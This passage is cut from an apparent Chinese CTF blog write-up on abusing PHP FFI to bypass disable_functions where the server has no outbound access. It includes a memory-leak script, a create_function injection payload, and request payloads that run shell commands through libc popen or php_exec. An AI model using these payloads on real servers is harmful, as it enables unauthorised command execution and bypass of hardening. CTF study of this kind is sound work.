+</span></span></span><span class=line><span class=cl><span class=s1>$b[3] = &#39;g&#39;;
+</span></span></span><span class=line><span class=cl><span class=s1>$newa = $ffi-&gt;cast(&#34;void*&#34;, $a);
+</span></span></span><span class=line><span class=cl><span class=s1>var_dump($newa);
+</span></span></span><span class=line><span class=cl><span class=s1>$newb = $ffi-&gt;cast(&#34;void*&#34;, $b);
+</span></span></span><span class=line><span class=cl><span class=s1>var_dump($newb);
+</span></span></span><span class=line><span class=cl><span class=s1>$addr_of_a = FFI::new(&#34;unsigned long long&#34;);
+</span></span></span><span class=line><span class=cl><span class=s1>FFI::memcpy($addr_of_a, FFI::addr($newa), 8);
+</span></span></span><span class=line><span class=cl><span class=s1>var_dump($addr_of_a);
+</span></span></span><span class=line><span class=cl><span class=s1>$leak = FFI::new(FFI::arrayType($ffi-&gt;type(&#39;char&#39;), [102400]), false);
+</span></span></span><span class=line><span class=cl><span class=s1>FFI::memcpy($leak, $newa-0x20000, 102400);
+</span></span></span><span class=line><span class=cl><span class=s1>$tmp = FFI::string($leak,102400);
+</span></span></span><span class=line><span class=cl><span class=s1>var_dump($tmp);
+</span></span></span><span class=line><span class=cl><span class=s1>//var_dump($leak);
+</span></span></span><span class=line><span class=cl><span class=s1>//$leak[0] = 0xdeadbeef;
+</span></span></span><span class=line><span class=cl><span class=s1>//$leak[1] = 0x61616161;
+</span></span></span><span class=line><span class=cl><span class=s1>//var_dump($a);
+</span></span></span><span class=line><span class=cl><span class=s1>//FFI::memcpy($newa-0x8, $leak, 128*8);
+</span></span></span><span class=line><span class=cl><span class=s1>//var_dump($a);
+</span></span></span><span class=line><span class=cl><span class=s1>//var_dump(777);
+</span></span></span><span class=line><span class=cl><span class=s1>} catch (FFI\Exception $ex) {
+</span></span></span><span class=line><span class=cl><span class=s1>echo $ex-&gt;getMessage(), PHP_EOL;
+</span></span></span><span class=line><span class=cl><span class=s1>}
+</span></span></span><span class=line><span class=cl><span class=s1>var_dump(1);
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span><span class=n>params</span><span class=o>=</span><span class=n>params</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>((</span><span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>))</span>
+</span></span></code></pre></td></tr></table></div></div><p>内存处理的代码是这里</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$addr_of_a</span> <span class=o>=</span> <span class=nx>FFI</span><span class=o>::</span><span class=na>new</span><span class=p>(</span><span class=s2>&#34;unsigned long long&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>FFI</span><span class=o>::</span><span class=na>memcpy</span><span class=p>(</span><span class=nv>$addr_of_a</span><span class=p>,</span> <span class=nx>FFI</span><span class=o>::</span><span class=na>addr</span><span class=p>(</span><span class=nv>$newa</span><span class=p>),</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nv>$addr_of_a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$leak</span> <span class=o>=</span> <span class=nx>FFI</span><span class=o>::</span><span class=na>new</span><span class=p>(</span><span class=nx>FFI</span><span class=o>::</span><span class=na>arrayType</span><span class=p>(</span><span class=nv>$ffi</span><span class=o>-&gt;</span><span class=na>type</span><span class=p>(</span><span class=s1>&#39;char&#39;</span><span class=p>),</span> <span class=p>[</span><span class=mi>102400</span><span class=p>]),</span> <span class=k>false</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>FFI</span><span class=o>::</span><span class=na>memcpy</span><span class=p>(</span><span class=nv>$leak</span><span class=p>,</span> <span class=nv>$newa</span><span class=o>-</span><span class=mh>0x20000</span><span class=p>,</span> <span class=mi>102400</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$tmp</span> <span class=o>=</span> <span class=nx>FFI</span><span class=o>::</span><span class=na>string</span><span class=p>(</span><span class=nv>$leak</span><span class=p>,</span> <span class=mi>102400</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>看不懂，相当于就是把地址内容复制过去了然后输出，再创建一个大小为 102400 字节的字符数组 <code>$leak</code>，并尝试从 <code>$newa</code> 偏移 <code>0x20000</code> 字节的地址处复制到 <code>$leak</code>，然后就泄露了？</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span><span class=n>ffi</span><span class=o>=</span><span class=n>FFI</span><span class=p>::</span><span class=nb>load</span><span class=p>(</span><span class=s2>&#34;/flag.h&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>a</span><span class=o>=$</span><span class=n>ffi</span><span class=o>-&gt;</span><span class=n>flag_wAt3_uP_apA3H1</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=n>var_dump</span><span class=p>(</span><span class=n>FFI</span><span class=p>::</span><span class=n>string</span><span class=p>(</span><span class=o>$</span><span class=n>a</span><span class=p>));</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=极客大挑战-2020-fighterfightsinvincibly>[极客大挑战 2020] FighterFightsInvincibly</h3><p>这里进去直接就可以拿到源码，一样的我们链接antsword</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!-- $_REQUEST[&#39;fighter&#39;]($_REQUEST[&#39;fights&#39;],$_REQUEST[&#39;invincibly&#39;]); --&gt;
+</span></span></code></pre></td></tr></table></div></div><p>这里很明显的一个<code>create_function</code>注入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>fighter=create_function&amp;fights=&amp;invincibly=;}phpinfo();/*
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/php-non-outbound-ffi/QQ20241110-164207.png width=820 height=438 loading=lazy alt=1></p><p>嗯宣那就链接就行，然后这里是不出网的，我们寻找C语言里面能够执行命令的并且不在disable里面的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php_exec
+</span></span><span class=line><span class=cl>popen
+</span></span></code></pre></td></tr></table></div></div><p><strong>popen</strong>是C语言的</p><p><strong>php_exec</strong>是php源码中的一个函数，当type为3时为<code>passthru</code>，为1时为<code>system</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$ffi</span><span class=o>=</span><span class=nx>FFI</span><span class=o>::</span><span class=na>cdef</span><span class=p>(</span><span class=s2>&#34;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&#34;</span><span class=p>,</span><span class=s2>&#34;libc.so.6&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=nx>ffi</span><span class=o>-&gt;</span><span class=na>popen</span><span class=p>(</span><span class=s2>&#34;ls /&#34;</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=p>((</span><span class=nv>$c</span><span class=o>=</span><span class=nv>$ffi</span><span class=o>-&gt;</span><span class=na>fgetc</span><span class=p>(</span><span class=nv>$a</span><span class=p>))</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$b</span><span class=o>.=</span><span class=nx>str_pad</span><span class=p>(</span><span class=nx>strval</span><span class=p>(</span><span class=nx>dechex</span><span class=p>(</span><span class=nv>$c</span><span class=p>)),</span><span class=mi>2</span><span class=p>,</span><span class=s2>&#34;0&#34;</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$ffi</span><span class=o>-&gt;</span><span class=na>pclose</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>hex2bin</span><span class=p>(</span><span class=nv>$b</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>fighter=create_function&amp;fights=&amp;invincibly=;}$ffi=FFI::cdef(&#34;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&#34;,&#34;libc.so.6&#34;);$a=$ffi-&gt;popen(&#34;ls /&#34;,&#34;r&#34;);$b=&#34;&#34;;while(($c=$ffi-&gt;fgetc($a))!=-1){$b.=str_pad(dechex($c),2,&#34;0&#34;,STR_PAD_LEFT);} $ffi-&gt;pclose($a);echo hex2bin($b);/*
+</span></span></code></pre></td></tr></table></div></div><p>成功了，还有一个也写写exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nv>$ffi</span><span class=o>=</span><span class=nx>FFI</span><span class=o>::</span><span class=na>cdef</span><span class=p>(</span><span class=s2>&#34;int php_exec(int type,char *cmd);&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$ffi</span><span class=o>-&gt;</span><span class=na>php_exec</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=s2>&#34;ls /&#34;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>fighter=create_function&amp;fights=&amp;invincibly=;}$ffi=FFI::cdef(&#34;int php_exec(int type,char *cmd);&#34;); $ffi-&gt;php_exec(3,&#34;ls /&#34;);/*
+</span></span></code></pre></td></tr></table></div></div><h1 id=0x03-小结>0x03 小结</h1><p>好玩好用，不过这个要对函数都比较熟悉，如果函数都不知道用那个也是白给</p></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>Php</a>
+<a href=/tags/%E5%A7%BF%E5%8A%BF/>姿势</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
